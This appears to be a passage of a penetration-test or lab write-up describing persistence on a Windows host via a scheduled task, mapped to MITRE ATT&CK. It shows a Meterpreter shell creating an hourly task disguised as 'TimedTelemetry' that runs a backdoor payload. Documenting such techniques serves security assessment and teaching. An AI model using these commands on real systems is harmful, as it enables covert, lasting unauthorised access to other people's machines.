Persistence & Execution (MITRE ATT&CK T1053.005 - Scheduled Task)

### Objective
The goal of this phase was to abuse native Windows task scheduling mechanics to execute a recurring backdoor payload silently, ensuring persistent access over specific intervals without depending on manual user reboots.

### Execution
After establishing an interactive session, a native Windows shell channel was spawned through **Meterpreter** to bypass framework module discrepancies and interact directly with the host's task configuration utility (`schtasks.exe`).

```msf
meterpreter > shell
Process 9772 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.6456]

C:\Users\jcruz\Downloads> schtasks /create /tn "TimedTelemetry" /tr "C:\Users\jcruz\Pictures\payload.exe" /sc hourly /mo 1
SUCCESS: The scheduled task "TimedTelemetry" has successfully been created.
